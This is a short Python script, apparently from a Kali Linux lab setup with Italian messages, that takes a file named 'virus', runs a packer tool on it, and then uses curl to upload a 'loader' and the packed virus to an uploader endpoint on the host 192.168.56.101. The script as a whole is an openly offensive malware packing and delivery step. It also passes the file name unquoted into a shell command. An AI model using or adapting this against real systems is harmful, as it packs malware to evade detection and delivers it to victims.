#!/usr/bin/python3

import sys
import subprocess
import os

virus = sys.argv[1]

try:
    subprocess.run(['/home/kali/Downloads/simplepack-master/pack', virus], check=True)
    print("Programma 'pack' eseguito con successo.")
except subprocess.CalledProcessError:
    print("Errore durante l'esecuzione di 'pack'.")

print("caricamento loader")
curl_cmd = f"curl -X POST -F \"file=@loader\" http://192.168.56.101:8080/uploader"
os.system(curl_cmd)

print("caricamento virus")
curl_cmd = f"curl -X POST -F \"file=@{virus}\" http://192.168.56.101:8080/uploader"
os.system(curl_cmd)
